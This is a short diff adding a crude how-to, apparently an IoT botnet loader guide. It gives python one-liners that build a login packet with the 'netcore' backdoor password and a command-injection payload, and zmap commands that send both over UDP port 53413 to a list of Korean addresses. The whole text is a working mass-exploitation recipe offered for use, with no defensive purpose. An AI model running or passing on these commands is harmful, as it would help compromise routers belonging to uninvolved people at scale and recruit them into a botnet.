@@ -1,0 +1,9 @@
+How to setup shit: (PASTE INTO SERVER)
+
+python -c "print 'A'*8 + 'netcore\x00'" > login
+python -c "print 'AA\x00\x00AAAA PAYLOAD base* *.sh;\x00'" > payload
+
+How to load:
+
+zmap -M udp -p53413 --probe-args=file:login -i eth0 -w korea.lst
+zmap -M udp -p53413 --probe-args=file:payload -i eth0 -w korea.lst
